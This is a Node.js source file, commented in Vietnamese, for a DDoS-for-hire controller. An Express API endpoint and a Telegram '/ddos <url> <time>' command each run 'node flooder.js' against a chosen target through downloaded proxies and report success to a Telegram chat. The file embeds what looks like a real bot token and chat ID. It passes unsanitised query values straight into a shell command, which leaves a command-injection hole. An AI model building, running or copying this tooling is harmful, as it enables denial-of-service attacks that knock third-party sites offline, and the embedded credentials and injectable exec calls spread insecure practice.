const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// Khởi tạo bot Telegram với token của bạn
const bot_token = "8152527907:AAFjtXCIPYHTErd9r8us8ScyvCydeL8y6nM"; // Thay bằng token bot của bạn
const chat_id = "-1002390662783"; // Thay bằng chat ID của bạn

const bot = new TelegramBot(bot_token, { polling: true });
const app = express();
const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;

app.use(express.json());

// Hàm gửi thông báo Telegram
const sendTelegramMessage = async (message) => {
    try {
        await bot.sendMessage(chat_id, message, { parse_mode: 'Markdown' });
    } catch (error) {
        console.error('Lỗi khi gửi tin nhắn Telegram:', error.message);
    }
};

// API endpoint để nhận yêu cầu từ API client
app.get('/api', async (req, res) => {
    const field = {
        url: req.query.url || undefined,
        time: req.query.time || undefined,
        rate: req.query.rate || undefined,
        thea: req.query.thea || undefined,
        proxy: req.query.proxy || undefined,
        api_key: req.query.api_key || undefined,
    };

    // Kiểm tra API key và các tham số
    if (field.api_key !== "quangdev") {
        return res.json({ status: 500, data: 'Khóa API không hợp lệ' });
    }

    if (!field.url || !urlRegex.test(field.url) || !field.time || isNaN(field.time)) {
        return res.json({ status: 400, message: "Tham số không hợp lệ. Dùng: /api?url=<url>&time=<time>" });
    }

    // Lệnh để gọi flooder.js
    const command = `node flooder.js ${field.url} ${field.time} 10 10 ${field.proxy}`;

    console.log(`API đang thực hiện DDoS URL: ${field.url} với thời gian: ${field.time} giây`);

    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Lỗi khi thực hiện: ${stderr}`);
            return res.json({ status: 500, message: "Thực thi thất bại" });
        }

        sendTelegramMessage(`*DDoS thành công!*\n🌐 *Host*: ${field.url}\n⏰ *Time*: ${field.time} giây`);
        return res.json({ status: 200, message: "DDoS thành công!" });
    });
});

// Lắng nghe các lệnh từ bot Telegram
bot.onText(/\/ddos (.+) (\d+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const url = match[1]; // Lấy URL từ lệnh
    const time = match[2]; // Lấy thời gian từ lệnh

    if (!url || !urlRegex.test(url) || !time || isNaN(time)) {
        bot.sendMessage(chatId, "Tham số không hợp lệ. Dùng: `/ddos <url> <time>`");
        return;
    }

    // Gửi thông báo khi bắt đầu tấn công DDoS
    const message = `*Bot đã nhận yêu cầu DDoS!*\n🌐 *Host*: ${url}\n⏰ *Time*: ${time} giây`;
    sendTelegramMessage(message);

    const command = `node flooder.js ${url} ${time} 10 10 proxies.txt`;

    // Thực thi lệnh DDoS
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`Bot lỗi khi thực hiện: ${stderr}`);
            bot.sendMessage(chatId, "Thực thi thất bại!");
            return;
        }

        console.log(`Kết quả tấn công DDoS: ${stdout}`);
        bot.sendMessage(chatId, `*DDoS thành công!*:\n🌐 *Host*: ${url}\n⏰ *Time*: ${time} giây\n\n${stdout}`);
    });
});

// API endpoint để tải proxy tự động
app.get('/proxy', async (req, res) => {
    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
    try {
        const response = await axios.get(proxyUrl);
        fs.writeFileSync('proxies.txt', response.data);
        console.log(`Đã tải tệp proxy`);
        return res.json({ status: 200, message: "Đã tải proxy thành công" });
    } catch (error) {
        console.error(`Lỗi khi tải proxy: ${error.message}`);
        return res.json({ status: 500, message: "Lỗi khi tải proxy" });
    }
});

// Khởi động server Express
const api_port = 4000;
app.listen(api_port, () => console.log(`API đã chạy trên cổng ${api_port}`));
